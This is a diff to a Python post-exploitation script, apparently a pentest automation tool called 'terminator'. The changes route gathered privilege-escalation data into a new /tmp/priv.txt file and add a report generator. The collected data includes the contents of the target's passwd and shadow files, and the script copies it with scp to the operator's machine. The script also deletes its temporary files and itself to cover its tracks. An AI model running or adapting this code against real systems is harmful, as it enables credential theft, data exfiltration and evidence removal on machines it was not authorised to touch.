@@ -2,6 +2,9 @@
 # author: suffs811
 # https://github.com/suffs811/the-terminator.git
 # purpose: automate enumeration, privilege escalation, persistence, exfiltration, and reporting stages of a pentest
+# initial shell will need to be done manually
+#
+# read the README.md file for more details
 #
 # <> note: for full terminator productivity, you will need to run the script *four* separate times:
 # first on your own machine, second time on the target machine after gaining initial shell, 
@@ -15,12 +18,6 @@
 #
 # usage: (stage 4-create report on local machine): python3 terminator.py report -o <output_file_name>
 
-'''
-TO DO:
-add local directory list file to github - directory-list.txt
-write report script
-test
-'''
 
 import os
 import argparse
@@ -507,8 +504,9 @@ def extract(username,password,local_ip,local_port):
    # write data to file
    print("\n### exfiltrating data... ###")
 
-   # create file to write data to
+   # create files to write data to
    os.system("touch /tmp/data_exfil.txt")
+   os.system("touch /tmp/priv.txt")
 
    # add peristence data to file
    os.system("echo '### persistence established with the following ###' >> /tmp/data_exfil.txt")
@@ -552,17 +550,17 @@ def extract(username,password,local_ip,local_port):
 
    # compile previous files into one for scp
    os.system("cat /tmp/esc.txt >> /tmp/sudo_l.txt")
-   os.system("cat /tmp/sudo_l.txt >> /tmp/data_exfil.txt")
+   os.system("cat /tmp/sudo_l.txt >> /tmp/priv.txt")
    os.system("cat /tmp/suid_esc.txt >> /tmp/suid.txt")
-   os.system("cat /tmp/suid.txt >> /tmp/data_exfil.txt")
-   os.system("cat /tmp/path_res.txt >> /tmp/data_exfil.txt")
-   os.system("cat /tmp/passwd_res.txt >> /tmp/data_exfil.txt")
-   os.system("cat /tmp/shad_res.txt >> /tmp/data_exfil.txt")
+   os.system("cat /tmp/suid.txt >> /tmp/priv.txt")
+   os.system("cat /tmp/path_res.txt >> /tmp/priv.txt")
+   os.system("cat /tmp/passwd_res.txt >> /tmp/priv.txt")
+   os.system("cat /tmp/shad_res.txt >> /tmp/priv.txt")
 
    # exfil the data files to local machine
    print("\n### sending data to root@{}/terminator/scp_output.txt... ###\n+input your local machine root password+".format(local_ip))
-   os.system("scp /tmp/data_exfil.txt root@{}:/terminator/scp_output.txt".format(local_ip))
-   print("\n*** data_exfil.txt sent to {}/terminator/scp_output.txt ***".format(local_ip))
+   os.system("scp /tmp/data_exfil.txt /tmp/priv.txt root@{}:/terminator/".format(local_ip))
+   print("\n*** data_exfil.txt and priv.txt sent to {}/terminator/ ***".format(local_ip))
 
 
 # cover tracks ###############################
@@ -604,6 +602,7 @@ def clear_tracks():
    os.system("rm -f /tmp/path_res.txt")
    os.system("rm -f /tmp/passwd_res.txt")
    os.system("rm -f /tmp/shad_res.txt")
+   os.system("rm -f /tmp/priv.txt")
    os.system("rm -rf /tmp/* 2>/dev/null")
    os.system("rm -f terminator.py")
    exit()
@@ -611,6 +610,30 @@ def clear_tracks():
 
 # report ###############################
 
+def report(ip,output):
+   os.system("touch /terminator/report.txt")
+   os.system("echo '-+- Penetration Testing Report for {} -+-' >> /terminator/report.txt".format(ip))
+   os.system("echo '' >> /terminator/report.txt")
+   os.system("echo '+ + + Stage 1 - Enumeration + + +' >> /terminator/report.txt")
+   os.system("echo '' >> /terminator/report.txt")
+   os.system("cat /terminator/enum.txt >> /terminator/report.txt")
+   os.system("echo '' >> /terminator/report.txt")
+   os.system("echo '+ + + Stage 2 - Exploitation / Initial Shell + + +' >> /terminator/report.txt")
+   os.system("echo '' >> /terminator/report.txt")
+   os.system(" echo ' *** ADD YOUR EXPLOITION METHOD FOR THE INITAL SHELL HERE ***' >> /terminator/report.txt")
+   os.system("echo '' >> /terminator/report.txt")
+   os.system("echo '+ + + Stage 3 - Privilege Escalation + + +' >> /terminator/report.txt")
+   os.system("echo '' >> /terminator/report.txt")
+   os.system("cat /terminator/priv.txt >> /terminator/report.txt")
+   os.system("echo '' >> /terminator/report.txt")
+   os.system("echo '+ + + Stage 4 - Persistence and Data Exfiltration + + +' >> /terminator/report.txt")
+   os.system("cat /terminator/data_exfil.txt >> /terminator/report.txt")
+   os.system("echo '' >> /terminator/report.txt")
+   os.system("echo '' >> /terminator/report.txt")
+   os.system("echo '--- END OF REPORT ---' >> /terminator/report.txt")
+   os.system("mv /terminator/report.txt /terminator/{}".format(output))
+   print("### penetration test report for {} is ready at /terminator/{} ###\nplease add your method for gaining the initial shell in the '+ + + Stage 2 - Exploitation / Initial Shell + + +' section.\nall reference data for enumeration, privilege escalation, and persistence/data exfiltration are located in /terminator/ as enum.txt, priv.txt, and data_exfil.txt, respectively.".format(ip,output))
+   print("\n\n-+- {} has been terminated -+-".format(ip))
 
 
 # call functions
@@ -652,7 +675,7 @@ elif level == "root":
       extract(username,password,local_ip,local_port)
       clear_tracks()
 elif level == "report":
-   # call report functions
-   pass
+   # call report function
+   report(ip,output)
 else:
    print("\n*** specify either 'enum', 'priv','root' or 'report' ***")
